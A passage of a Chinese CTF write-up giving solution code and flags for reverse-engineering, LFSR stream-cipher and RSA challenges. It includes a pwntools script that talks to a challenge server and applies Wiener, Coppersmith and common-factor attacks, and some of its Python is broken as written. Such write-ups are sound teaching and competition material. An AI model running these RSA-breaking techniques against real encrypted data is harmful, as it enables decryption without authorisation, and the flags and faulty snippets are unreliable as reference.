	G(0x47, 0xe9, 0xa9, 0xee, 0x27, 0xce), G(0x45, 0xea, 0xa0, 0xe5, 0x2a, 0xc0),
	G(0x7b, 0xcb, 0x47, 0x3c, 0xb1, 0x7a), G(0x79, 0xc8, 0x4e, 0x37, 0xbc, 0x74),
	G(0x7f, 0xcd, 0x55, 0x2a, 0xab, 0x66), G(0x7d, 0xce, 0x5c, 0x21, 0xa6, 0x68),
	G(0x73, 0xc7, 0x63, 0x10, 0x85, 0x42), G(0x71, 0xc4, 0x6a, 0x1b, 0x88, 0x4c),
	G(0x77, 0xc1, 0x71, 0x06, 0x9f, 0x5e), G(0x75, 0xc2, 0x78, 0x0d, 0x92, 0x50),
	G(0x6b, 0xd3, 0x0f, 0x64, 0xd9, 0x0a), G(0x69, 0xd0, 0x06, 0x6f, 0xd4, 0x04),
	G(0x6f, 0xd5, 0x1d, 0x72, 0xc3, 0x16), G(0x6d, 0xd6, 0x14, 0x79, 0xce, 0x18),
	G(0x63, 0xdf, 0x2b, 0x48, 0xed, 0x32), G(0x61, 0xdc, 0x22, 0x43, 0xe0, 0x3c),
	G(0x67, 0xd9, 0x39, 0x5e, 0xf7, 0x2e), G(0x65, 0xda, 0x30, 0x55, 0xfa, 0x20),
	G(0x9b, 0x5b, 0x9a, 0x01, 0xb7, 0xec), G(0x99, 0x58, 0x93, 0x0a, 0xba, 0xe2),
	G(0x9f, 0x5d, 0x88, 0x17, 0xad, 0xf0), G(0x9d, 0x5e, 0x81, 0x1c, 0xa0, 0xfe),
	G(0x93, 0x57, 0xbe, 0x2d, 0x83, 0xd4), G(0x91, 0x54, 0xb7, 0x26, 0x8e, 0xda),
	G(0x97, 0x51, 0xac, 0x3b, 0x99, 0xc8), G(0x95, 0x52, 0xa5, 0x30, 0x94, 0xc6),
	G(0x8b, 0x43, 0xd2, 0x59, 0xdf, 0x9c), G(0x89, 0x40, 0xdb, 0x52, 0xd2, 0x92),
	G(0x8f, 0x45, 0xc0, 0x4f, 0xc5, 0x80), G(0x8d, 0x46, 0xc9, 0x44, 0xc8, 0x8e),
	G(0x83, 0x4f, 0xf6, 0x75, 0xeb, 0xa4), G(0x81, 0x4c, 0xff, 0x7e, 0xe6, 0xaa),
	G(0x87, 0x49, 0xe4, 0x63, 0xf1, 0xb8), G(0x85, 0x4a, 0xed, 0x68, 0xfc, 0xb6),
	G(0xbb, 0x6b, 0x0a, 0xb1, 0x67, 0x0c), G(0xb9, 0x68, 0x03, 0xba, 0x6a, 0x02),
	G(0xbf, 0x6d, 0x18, 0xa7, 0x7d, 0x10), G(0xbd, 0x6e, 0x11, 0xac, 0x70, 0x1e),
	G(0xb3, 0x67, 0x2e, 0x9d, 0x53, 0x34), G(0xb1, 0x64, 0x27, 0x96, 0x5e, 0x3a),
	G(0xb7, 0x61, 0x3c, 0x8b, 0x49, 0x28), G(0xb5, 0x62, 0x35, 0x80, 0x44, 0x26),
	G(0xab, 0x73, 0x42, 0xe9, 0x0f, 0x7c), G(0xa9, 0x70, 0x4b, 0xe2, 0x02, 0x72),
	G(0xaf, 0x75, 0x50, 0xff, 0x15, 0x60), G(0xad, 0x76, 0x59, 0xf4, 0x18, 0x6e),
	G(0xa3, 0x7f, 0x66, 0xc5, 0x3b, 0x44), G(0xa1, 0x7c, 0x6f, 0xce, 0x36, 0x4a),
	G(0xa7, 0x79, 0x74, 0xd3, 0x21, 0x58), G(0xa5, 0x7a, 0x7d, 0xd8, 0x2c, 0x56),
	G(0xdb, 0x3b, 0xa1, 0x7a, 0x0c, 0x37), G(0xd9, 0x38, 0xa8, 0x71, 0x01, 0x39),
	G(0xdf, 0x3d, 0xb3, 0x6c, 0x16, 0x2b), G(0xdd, 0x3e, 0xba, 0x67, 0x1b, 0x25),
	G(0xd3, 0x37, 0x85, 0x56, 0x38, 0x0f), G(0xd1, 0x34, 0x8c, 0x5d, 0x35, 0x01),
	G(0xd7, 0x31, 0x97, 0x40, 0x22, 0x13), G(0xd5, 0x32, 0x9e, 0x4b, 0x2f, 0x1d),
	G(0xcb, 0x23, 0xe9, 0x22, 0x64, 0x47), G(0xc9, 0x20, 0xe0, 0x29, 0x69, 0x49),
	G(0xcf, 0x25, 0xfb, 0x34, 0x7e, 0x5b), G(0xcd, 0x26, 0xf2, 0x3f, 0x73, 0x55),
	G(0xc3, 0x2f, 0xcd, 0x0e, 0x50, 0x7f), G(0xc1, 0x2c, 0xc4, 0x05, 0x5d, 0x71),
	G(0xc7, 0x29, 0xdf, 0x18, 0x4a, 0x63), G(0xc5, 0x2a, 0xd6, 0x13, 0x47, 0x6d),
	G(0xfb, 0x0b, 0x31, 0xca, 0xdc, 0xd7), G(0xf9, 0x08, 0x38, 0xc1, 0xd1, 0xd9),
	G(0xff, 0x0d, 0x23, 0xdc, 0xc6, 0xcb), G(0xfd, 0x0e, 0x2a, 0xd7, 0xcb, 0xc5),
	G(0xf3, 0x07, 0x15, 0xe6, 0xe8, 0xef), G(0xf1, 0x04, 0x1c, 0xed, 0xe5, 0xe1),
	G(0xf7, 0x01, 0x07, 0xf0, 0xf2, 0xf3), G(0xf5, 0x02, 0x0e, 0xfb, 0xff, 0xfd),
	G(0xeb, 0x13, 0x79, 0x92, 0xb4, 0xa7), G(0xe9, 0x10, 0x70, 0x99, 0xb9, 0xa9),
	G(0xef, 0x15, 0x6b, 0x84, 0xae, 0xbb), G(0xed, 0x16, 0x62, 0x8f, 0xa3, 0xb5),
	G(0xe3, 0x1f, 0x5d, 0xbe, 0x80, 0x9f), G(0xe1, 0x1c, 0x54, 0xb5, 0x8d, 0x91),
	G(0xe7, 0x19, 0x4f, 0xa8, 0x9a, 0x83), G(0xe5, 0x1a, 0x46, 0xa3, 0x97, 0x8d),
};
#undef G

static void expand_key(uint8_t *expandedKey, uint8_t *key, int size, size_t expandedKeySize)
{
	int csz;
	int i;
	uint8_t t[4] = { 0 };

	for (i = 0; i < size; i++)
		expandedKey[i] = key[i];
	csz = size;

	i = 1;
	while (csz < expandedKeySize) {
		t[0] = expandedKey[(csz - 4) + 0];
		t[1] = expandedKey[(csz - 4) + 1];
		t[2] = expandedKey[(csz - 4) + 2];
		t[3] = expandedKey[(csz - 4) + 3];

		if (csz % size == 0) {
			uint8_t tmp;

			tmp = t[0];
			t[0] = sbox[t[1]] ^ Rcon[i++ % sizeof(Rcon)];
			t[1] = sbox[t[2]];
			t[2] = sbox[t[3]];
			t[3] = sbox[tmp];
		}

		if (size == 32 && ((csz % size) == 16)) {
			t[0] = sbox[t[0]];
			t[1] = sbox[t[1]];
			t[2] = sbox[t[2]];
			t[3] = sbox[t[3]];
		}

		expandedKey[csz] = expandedKey[csz - size] ^ t[0]; csz++;
		expandedKey[csz] = expandedKey[csz - size] ^ t[1]; csz++;
		expandedKey[csz] = expandedKey[csz - size] ^ t[2]; csz++;
		expandedKey[csz] = expandedKey[csz - size] ^ t[3]; csz++;
	}
}

static void shift_rows(uint8_t *state)
{
	uint32_t *s32;
	int i;

	for (i = 0; i < 16; i++)
		state[i] = sbox[state[i]];
	s32 = (uint32_t *) state;
	s32[1] = rol32_be(s32[1], 8);
	s32[2] = rol32_be(s32[2], 16);
	s32[3] = rol32_be(s32[3], 24);
}

static void add_round_key(uint8_t *state, uint8_t *rk)
{

    state[0]^=rk[12];
    state[4]^=rk[8];
    state[8]^=rk[4];
    state[12]^=rk[0];
    state[1]^=rk[13];
    state[5]^=rk[9];
    state[9]^=rk[5];
    state[13]^=rk[1];
    state[2]^=rk[14];
    state[6]^=rk[10];
    state[10]^=rk[6];
    state[14]^=rk[2];
    state[3]^=rk[15];
    state[7]^=rk[11];
    state[11]^=rk[7];
    state[15]^=rk[3];
}

#define gm1(a) (a)
#define gm2(a) gmtab[a][0]
#define gm3(a) gmtab[a][1]
#define gm9(a) gmtab[a][2]
#define gm11(a) gmtab[a][3]
#define gm13(a) gmtab[a][4]
#define gm14(a) gmtab[a][5]

static void mix_columns(uint8_t *state)
{
	int i;
	uint8_t cpy[4];

	for (i = 0; i < 4; i++) {
		cpy[0] = state[0 * 4 + i];
		cpy[1] = state[1 * 4 + i];
		cpy[2] = state[2 * 4 + i];
		cpy[3] = state[3 * 4 + i];
		state[i] = gm2(cpy[0]) ^ gm1(cpy[3]) ^ gm1(cpy[2]) ^ gm3(cpy[1]);
		state[4+i] = gm2(cpy[1]) ^ gm1(cpy[0]) ^ gm1(cpy[3]) ^ gm3(cpy[2]);
		state[8+i] = gm2(cpy[2]) ^ gm1(cpy[1]) ^ gm1(cpy[0]) ^ gm3(cpy[3]);
		state[12+i] = gm2(cpy[3]) ^ gm1(cpy[2]) ^ gm1(cpy[1]) ^ gm3(cpy[0]);
	}
}

static void create_round_key(uint8_t *expandedKey, uint8_t *rk)
{
	int i,j;
	for (i = 0; i < 4; i++)
		for (j = 0; j < 4; j++)
			rk[i + j * 4] = expandedKey[i * 4 + j];
}

static void aes_main(aes_key *key, uint8_t *state)
{
	int i = 0;
	uint32_t rk[4];
	uint8_t *rkptr = (uint8_t *) rk;

		//create_round_key(key->data + 16 * i, rkptr);
       //add_round_key(state, rkptr);
    
	for (i = 0; i < 9; i++) {
		create_round_key(key->data + 16 * i, rkptr);
       add_round_key(state, rkptr);
		shift_rows(state);
		mix_columns(state);
		
	}

	create_round_key(key->data + 16 * 9, rkptr);
    add_round_key(state, rkptr);
	shift_rows(state);
	//mix_columns(state);
    create_round_key(key->data + 16 * 10, rkptr);
    add_round_key(state, rkptr);
	
}

static void shift_rows_inv(uint8_t *state)
{
	uint32_t *s32;
	int i;

	s32 = (uint32_t *) state;
	s32[1] = ror32_be(s32[1], 8);
	s32[2] = ror32_be(s32[2], 16);
	s32[3] = ror32_be(s32[3], 24);
	for (i = 0; i < 16; i++)
		state[i] = rsbox[state[i]];
}

static void mix_columns_inv(uint8_t *state)
{
	int i;
	uint8_t cpy[4];

	for (i = 0; i < 4; i++) {
		cpy[0] = state[0 * 4 + i];
		cpy[1] = state[1 * 4 + i];
		cpy[2] = state[2 * 4 + i];
		cpy[3] = state[3 * 4 + i];
		state[i] = gm14(cpy[0]) ^ gm9(cpy[3]) ^ gm13(cpy[2]) ^ gm11(cpy[1]);
		state[4+i] = gm14(cpy[1]) ^ gm9(cpy[0]) ^ gm13(cpy[3]) ^ gm11(cpy[2]);
		state[8+i] = gm14(cpy[2]) ^ gm9(cpy[1]) ^ gm13(cpy[0]) ^ gm11(cpy[3]);
		state[12+i] = gm14(cpy[3]) ^ gm9(cpy[2]) ^ gm13(cpy[1]) ^ gm11(cpy[0]);
	}
}

static void aes_main_inv(aes_key *key, uint8_t *state)
{
	int i = 0;
	uint32_t rk[4];
	uint8_t *rkptr = (uint8_t *) rk;
	create_round_key(key->data + 16 * 10, rkptr);
    add_round_key(state, rkptr);
	shift_rows_inv(state);
	//mix_columns(state);
    create_round_key(key->data + 16 * 9, rkptr);
    add_round_key(state, rkptr);
	for (i = 8; i >-1; i--) {
        mix_columns_inv(state);
        shift_rows_inv(state);
		create_round_key(key->data + 16 * i, rkptr);
        add_round_key(state, rkptr);
		
		
		
	}


}

/* Set the block values, for the block:
 * a0,0 a0,1 a0,2 a0,3
 * a1,0 a1,1 a1,2 a1,3 -> a0,0 a1,0 a2,0 a3,0 a0,1 a1,1 ... a2,3 a3,3
 * a2,0 a2,1 a2,2 a2,3
 * a3,0 a3,1 a3,2 a3,3
 */
#define swap_block(t, f) \
	t[0] = f[0]; t[4] = f[1]; t[8] = f[2]; t[12] = f[3]; \
	t[1] = f[4]; t[5] = f[5]; t[9] = f[6]; t[13] = f[7]; \
	t[2] = f[8]; t[6] = f[9]; t[10] = f[10]; t[14] = f[11]; \
	t[3] = f[12]; t[7] = f[13]; t[11] = f[14]; t[15] = f[15]



int aes_decode(uint8_t * in,int ss) {



uint8_t w1[192] = {
    0x34, 0x63, 0x38, 0x66, 0x36, 0x35, 0x30, 0x39, 0x63, 0x63, 0x34, 0x65, 0x31, 0x61, 0x39, 0x66,
    0x07, 0xA4, 0xD7, 0x75, 0x31, 0x91, 0xE7, 0x4C, 0x52, 0xF2, 0xD3, 0x29, 0x63, 0x93, 0xEA, 0x4F,
    0x83, 0x5F, 0x0B, 0xF0, 0xB2, 0xCE, 0xEC, 0xBC, 0xE0, 0x3C, 0x3F, 0x95, 0x83, 0xAF, 0xD5, 0xDA,
    0xD4, 0xB3, 0x72, 0xF7, 0x66, 0x7D, 0x9E, 0x4B, 0x86, 0x41, 0xA1, 0xDE, 0x05, 0xEE, 0x74, 0x04,
    0x26, 0xD8, 0x5A, 0x6D, 0x40, 0xA5, 0xC4, 0x26, 0xC6, 0xE4, 0x65, 0xF8, 0xC3, 0x0A, 0x11, 0xFC,
    0x96, 0xF6, 0x3D, 0xFF, 0xD6, 0x53, 0xF9, 0xD9, 0x10, 0xB7, 0x9C, 0x21, 0xD3, 0xBD, 0x8D, 0xDD,
    0x57, 0x90, 0x47, 0x82, 0x81, 0xC3, 0xBE, 0x5B, 0x91, 0x74, 0x22, 0x7A, 0x42, 0xC9, 0xAF, 0xA7,
    0x0B, 0xBC, 0x9A, 0xBB, 0x8A, 0x7F, 0x24, 0xE0, 0x1B, 0x0B, 0x06, 0x9A, 0x59, 0xC2, 0xA9, 0x3D,
    0x2C, 0x77, 0xBF, 0xE8, 0xA6, 0x08, 0x9B, 0x08, 0xBD, 0x03, 0x9D, 0x92, 0xE4, 0xC1, 0x34, 0xAF,
    0x55, 0x1E, 0xC7, 0xEB, 0xF3, 0x16, 0x5C, 0xE3, 0x4E, 0x15, 0xC1, 0x71, 0xAA, 0xD4, 0xF5, 0xDE,
    0x48, 0xB2, 0x8F, 0x3B, 0xBB, 0xA4, 0xD3, 0xD8, 0xF5, 0xB1, 0x12, 0xA9, 0x5F, 0x65, 0xE7, 0x77,
    0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF 
};
void convert(uint8_t *state1,uint8_t *state2){
    state2[0]=state1[0];
state2[4]=state1[1];
state2[8]=state1[2];
state2[12]=state1[3];
    state2[1]=state1[4];
state2[5]=state1[5];
state2[9]=state1[6];
state2[13]=state1[7];
    state2[2]=state1[8];
state2[6]=state1[9];
state2[10]=state1[10];
state2[14]=state1[11];
    state2[3]=state1[12];
state2[7]=state1[13];
state2[11]=state1[14];
state2[15]=state1[15];

}
uint8_t w2[192] = {
    0x39, 0x30, 0x65, 0x31, 0x66, 0x61, 0x65, 0x30, 0x66, 0x31, 0x37, 0x34, 0x64, 0x38, 0x31, 0x34,
    0x21, 0x73, 0x62, 0xF7, 0x47, 0x12, 0x07, 0xC7, 0x21, 0x23, 0x30, 0xF3, 0x45, 0x1B, 0x01, 0xC7,
    0xE7, 0x1D, 0xCD, 0x89, 0xA0, 0x0F, 0xCA, 0x4E, 0x81, 0x2C, 0xFA, 0xBD, 0xC4, 0x37, 0xFB, 0x7A,
    0x3D, 0x01, 0x57, 0x82, 0x9D, 0x0E, 0x9D, 0xCC, 0x1C, 0x22, 0x67, 0x71, 0xD8, 0x15, 0x9C, 0x0B,
    0x16, 0x60, 0x0E, 0x54, 0x8B, 0x6E, 0x93, 0x98, 0x97, 0x4C, 0xF4, 0xE9, 0x4F, 0x59, 0x68, 0xE2,
    0x8E, 0xE4, 0xC5, 0x01, 0x05, 0x8A, 0x56, 0x99, 0x92, 0xC6, 0xA2, 0x70, 0xDD, 0x9F, 0xCA, 0x92,
    0xC1, 0x25, 0x1E, 0x55, 0xC4, 0xAF, 0x48, 0xCC, 0x56, 0x69, 0xEA, 0xBC, 0x8B, 0xF6, 0x20, 0x2E,
    0xF0, 0x18, 0x5C, 0xA2, 0x34, 0xB7, 0x14, 0x6E, 0x62, 0xDE, 0xFE, 0xD2, 0xE9, 0x28, 0xDE, 0xFC,
    0x40, 0x06, 0x68, 0x3F, 0x74, 0xB1, 0x7C, 0x51, 0x16, 0x6F, 0x82, 0x83, 0xFF, 0x47, 0x5C, 0x7F,
    0x92, 0x10, 0xC8, 0x6E, 0xE6, 0xA1, 0xB4, 0x3F, 0xF0, 0xCE, 0x36, 0xBC, 0x0F, 0x89, 0x6A, 0xC3,
    0xBC, 0x66, 0x6F, 0x5A, 0x5A, 0xC7, 0xDB, 0x65, 0xAA, 0x09, 0xED, 0xD9, 0xA5, 0x80, 0x87, 0x1A,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF 
};
aes_key * key=(aes_key *)malloc(sizeof( aes_key));
key->nbr=10;
	if(ss){

	key->data=w2;
    }
    else{
    key->data=w1;
    }
    uint8_t in2[16];
    convert(in,in2);
    //uint32_t rk[4];
	//uint8_t *rkptr = (uint8_t *) rk;
    //create_round_key(key->data , rkptr);
    //add_round_key(in2, rkptr);
    //shift_rows(in2);
    

    //aes_main(key, in2);    
    aes_main_inv(key,in2);
    convert(in2,in);
    
}

int main(int argc, char* argv[]){
int aa=atoi(argv[1]);

    int i;
  FILE  *infile;

    

    infile = fopen("tmp", "rb");

    uint8_t in[16];

    if(  infile == NULL )

    {
        exit(1);
    }   

   

    int rc;

    rc = fread(in,sizeof(uint8_t ), 16,infile);

   
    aes_decode(in,aa);

	for (i = 0; i < 16; i++) {
		printf("%x ", in[i]);
	}
   

}
```


flag：flag{!T_!S_a_s!Mpi3_PLctuRe_LOC33r}












## simplecheck

android 逆向，就是一个简单的解一元二次方程组，然后拼成 flag{MAth_i&_GOOd_DON7_90V_7hInK?}
```python
from sympy import   *
  

f1762a = \[0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312\]

f1763b = \[13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108\]

f1764c = \[38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666\]

f1765d = \[0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562\]

  

iArr = \[0\]

  

for i in   range(len(f1764c)):

x = symbols('x')

a1 = solve(f1763b\[i\]*x**2+f1764c\[i\]*x-f1762a\[i+1\]+f1765d\[i\], x)

a2 = solve(f1763b\[i+1\]*x**2+f1764c\[i+1\]*x+f1765d\[i+1\]-f1762a\[i+1\], x)

 for i in a1:

 for j in a2:

 if i == j:

iArr.append(chr(i))

  

print   ''.join(iarr\[1::\])

```















## 签到

复制粘贴

flag{welcome_to_qwb}


## streamgame1

本题给出了一个线性反馈移位寄存器，给定输出的所有bit位，求初始seed，由于seed的长度较小，完全可以暴力枚举并验证，详细解题过程如下：

```
>>> key='5538F742C10DB2C7EDE0243A'.decode('hex')
>>> ks=''
>>> for ch in key:
	ks+=bin(ord(ch))[2:].rjust(8,'0')

	
>>> def lfsr(R,mask):
    output = (R << 1) & 0xffffff
    i=(R&mask)&0xffffff
    lastbit=0
    while i!=0:
        lastbit^=(i&1)
        i=i>>1
    output^=lastbit
    return (output,lastbit)

>>> mask    =   0b1010011000100011100
>>> 
>>> for i in range(2**19):
	R=i
	ok=True
	for j in range(96):
		(R,out)=lfsr(R,mask)
		if out!=int(ks[j]):
			ok=False
			break
	if ok:
		print i

		
481387
>>> bin(481387)
'0b1110101100001101011'
>>> 'flag{'+bin(481387)[2:].rjust(19,'0')+'}'
'flag{1110101100001101011}'
```


## streamgame2

与上一题完全相同，seed部分长了两位，不过还是可以暴力出来，过程同上，最终结果如下：

```
>>> 'flag{'+bin(1821289)[2:].rjust(21,'0')+'}'
'flag{110111100101001101001}'
```

## streamgame3

本题在前两题的基础上，使用了3个流来同时产生随机数，并将3个流的bit结果混合成1个bit输出。大概思路是根据当前的输出流用z3将其分离为3个独立的流，理论上只用到前72个bit即可解出，不知为何给了1G左右的数据。

根据数据流生成方式，模拟符号执行生成变量关系的数组如下（变量有冗余，比赛中来不及改）：

```
a1 = []

msk=['000000010000000000100000',
     '000001000001000000001100',
     '000100000000000000000010']

for i in range(24):
    a2=[]
    for j in range(3):
        a3=[0]*72
        a3[j*24+i]=1
        a2.append(a3)
    a1.append(a2)

for i in range(144):
    a2=[]
    for j in range(3):
        a3=[0]*72
        for j2 in range(24):
            if msk[j][j2]=='1':
                idx=i+j2
                for j3 in range(72):
                    a3[j3]=a3[j3]^a1[idx][j][j3]
        a2.append(a3)
    a1.append(a2)

arr=[]
for i in range(144+24):
    a2=[]
    for j in range(3):
        a3=[]
        for k in range(72):
            if a1[i][j][k]==1:
                a3.append(k)
        a2.append(a3)
    arr.append(a2)

f=open('arr','w')
print >>f, repr(arr)
```

根据上述数组，使用z3进行求解的脚本如下，很不幸存在多解，所以尝试枚举多种可能，最后发现是前几个bit可以任意设置，所以根据原加密脚本的assert筛选出正确结果

```
from z3 import *

for magic in range(1):
    
    f=open('arr')
    arr=eval(f.read())
    ks='0110111000101011010011011110111100110010100110000111110010111100100101101010100100111111010011100001100000011000001111111111001101011110011110010010110011000100010110111110010101001001011001011111011101101110111011111111111011000101011110001010110100010101'
    
    f=open('dump'+str(magic),'w')
    
    assert len(arr)<len(ks)
    
    s=Solver()
    x=[0]*72
    for i in range(72):
        x[i] = Bool('x%02d'%i)

    magic=0b1111
    for i in range(6):
        if magic&(1<<i)==0:
            s.add(x[i]==False)
        else:
            s.add(x[i]==True)
            
    for i in range(len(arr)):
        tmp = [0]*3
        for j in range(3):
            if len(arr[i][j])>2:
                t2 = Xor(x[arr[i][j][0]],x[arr[i][j][1]])
                for k in arr[i][j][2:]:
                    t3=Xor(t2,x[k])
                    t2=t3
                tmp[j]=t2
            elif len(arr[i][j])==2:
                tmp[j] = Xor(x[arr[i][j][0]],x[arr[i][j][1]])
            elif len(arr[i][j])==1:
                tmp[j] = x[arr[i][j][0]]
        if ks[i]=='1':
            s.add(Xor(And(tmp[0],tmp[1]),And(Xor(tmp[1],True),tmp[2]))==True)
        else:
            s.add(Xor(And(tmp[0],tmp[1]),And(Xor(tmp[1],True),tmp[2]))==False)
    
    print magic,s.check()
    try:
        print >>f,s.model()
    except:
        pass
    f.close()
    
```

对于z3结果进行解析并求出随机流的脚本如下：

```
from random import randint

def lfsr(R,mask):
    output = (R << 1) & 0xffffff
    i=(R&mask)&0xffffff
    lastbit=0
    while i!=0:
        lastbit^=(i&1)
        i=i>>1
    output^=lastbit
    return (output,lastbit)

for magic in range(1):
    f=open('dump'+str(magic))
    cont=f.read()
    raw=cont.split('\n')[:-1]

    if len(raw)!=72:
        print 'ERROR',magic
        continue

    b=[0]*72
    for line in raw:
        idx=int(line[2:4])
        if 'True' in line:
            b[idx]=1
        else:
            b[idx]=0
    
    bs = ''.join(map(str,b))
    ks='011011100010101101001101111011110011001010011000011111001011110010010110'
    ks='0110111000101011010011011110111100110010100110000111110010111100100101101010100100111111010011100001100000011000001111111111001101011110011110010010110011000100010110111110010101001001011001011111011101101110111011111111111011000101011110001010110100010101'
    
    r1=b[:24]
    r2=b[24:48]
    r3=b[48:]
    r1.extend([0]*300)
    r2.extend([0]*300)
    r3.extend([0]*300)
    
    msk=['000000010000000000100000',
         '000001000001000000001100',
         '000100000000000000000010']
    
    def dotest():
        for i in range(24):
            if (r1[i]*r2[i])^((r2[i]^1)*r3[i])!=int(ks[i]):
                print 'Error',i
                return False
    
        for i in range(24,256):
            r1[i]=0
            for j in range(24):
                if msk[0][j]=='1':
                    idx=i-(24-j)
                    r1[i]^=r1[idx]
            r2[i]=0
            for j in range(24):
                if msk[1][j]=='1':
                    idx=i-(24-j)
                    r2[i]^=r2[idx]
            r3[i]=0
            for j in range(24):
                if msk[2][j]=='1':
                    idx=i-(24-j)
                    r3[i]^=r3[idx]
            if (r1[i]*r2[i])^((r2[i]^1)*r3[i])!=int(ks[i]):
                print 'Error',i
                return False
        return True

    print bs[:72]
    exit()
    print dotest()
    
    mask=0x10020
    ks=bs[:24]
    print ks
    for i in range(2**17):
        R=i
        ok=True
        for j in range(24):
            (R,out)=lfsr(R,mask)
            if out!=int(ks[j]):
                ok=False
                break
        if ok:
            print i
        break
    if ok:
        print bs[:72]
```

获取到所有流后，使用前两题一样的方法求得seed，最后结果如下：

```
#113099
#366492
#1487603
>>> 'flag{'+hex(r1)[2:].rjust(6,'0')+hex(r2)[2:].rjust(6,'0')+hex(r3)[2:].rjust(6,'0')+'}'
'flag{01b9cb05979c16b2f3}'
```



## streamgame4

与上几题仍然完全相同，线性反馈移位寄存器变成了非线性，由于我们采用的是暴力枚举，非线性完全不构成影响，最终结果如下：

```
>>> 'flag{'+bin(1209707)[2:].rjust(21,'0')+'}'
'flag{100100111010101101011}'
```

## nextrsa

本题给出了服务器端口，连上去后要求解RSA，每一次的方法如下。

1. n非常小，直接分解。
2. e较大，使用wiener attack即可求解。
3. 已知高位明文，使用coppersmith attack求解
4. 给出n以及nextprime(p)\*nextprime(q)，由于素数之间间隔较小，我们用二重循环枚举素数间隔，获得间隔后求解一元二次方程即可，脚本如下：
```
for d1 in range(1,1500):
	for d2 in range(d1,1500):
		f=x*(delta-d1*d2-d2*x)-d1*n
		ans=f.roots(ring=ZZ)
		if len(ans)>0:
			print d1,d2
			print ans

576 1320
[(132940802289018336261987415312533953042764596984032548157327529495089307889127354914528507277209940457450746338751400025568015673025956762534143027257695791611900765053802453566263676389771478041671317414828940200119172760057249923066534954345956113954028278683477795444749575874548525999126508093286460575953, 1)]
```
5. 存在小因子，直接使用yafu分解即可
6. e=3，尝试不断将密文加上n并直接求整数的次方根，加到10000多次后解得明文
7. 给出n1和n2两个大整数，根据共同因子进行分解即可
8. 给出了同一明文在相同n不同e下的加密结果，根据模运算即可得到明文，详情见脚本
9. e=3，给出同一明文的多次加密，使用中国剩余定理即可

交互脚本如下：

```
from pwn import *
from Crypto.Util.number import *
from hashlib import sha256

context.log_level='debug'

token = 'icqde8dabd22289554a0a90dd871d6b3' 
c = remote('39.107.33.90', 9999)
c.sendlineafter('teamtoken:', token)
c.recvuntil('()[0:8]==\'')
proof = c.recvline()[:-2]
print proof

def dopow():
    for i in range(0xff):
        for i2 in range(0xff):
            for i3 in range(0x1f):
                x=chr(i)+chr(i2)+chr(i3)
                if sha256(x).hexdigest()[:8] == proof:
                    return x
            
x=dopow()
c.sendlineafter("x.encode('hex')=",x.encode('hex'))

#small
def solve1(ct):
    p=289540461376837531747468286266019261659
    q=306774653454153140532319815768090345109
    e=0x10001
    n=p*q
    phi=(p-1)*(q-1)
    d=inverse(e,phi)
    return pow(ct,d,n)

c.recvuntil('c=')
ct=int(c.recvline(),16)
m=solve1(ct)
c.sendlineafter('m=',hex(m).replace("L",""))

#wiener
def solve2(ct): 
    d=42043
    n=0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1
    return pow(ct,d,n)

c.recvuntil('c=')
ct=int(c.recvline(),16)
m=solve2(ct)
c.sendlineafter('m=',hex(m).replace("L",""))

# coppersmith
m=13348217672476185556960937863052618856907409443284018618487715667398543252004348293291155872885336598114605302423080410845391422647005739326269483358434155
b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
m-=b
c.sendlineafter('m=',hex(m).replace("L",""))

# nextprime
def solve4(ct): 
    p=132940802289018336261987415312533953042764596984032548157327529495089307889127354914528507277209940457450746338751400025568015673025956762534143027257695791611900765053802453566263676389771478041671317414828940200119172760057249923066534954345956113954028278683477795444749575874548525999126508093286460575953
    q=114791494681514143990268371423282183138226784645868909558224024738011633713833580549522009721245299751435183564384247261418984397745114977301564583085777881485180217075670585703780063072373569054286277474670485124459902688373648390826470893613150198411843162021692225644621249349903453125961550887837378298881L
    e=0x10001
    n=p*q
    phi=(p-1)*(q-1)
    d=inverse(e,phi)
    return pow(ct,d,n)

c.recvuntil('c=')
ct=int(c.recvline(),16)
m=solve4(ct)
c.sendlineafter('m=',hex(m).replace("L",""))

#small factor
def solve5(ct): 
    p=2652524669
    q=120393827811847730665892922601047874074897457839754965824187553709286586875999984122668238470178081377988439748992735957987417809407665405412580451688753139556272709693049760814986485709769800614157806922562929660004878835280427602632657375319022388348710785821982994403660254841027504457789884082670526620753
    e=0x10001
    n=p*q
    phi=(p-1)*(q-1)
    d=inverse(e,phi)
    return pow(ct,d,n)

c.recvuntil('c=')
ct=int(c.recvline(),16)
m=solve5(ct)
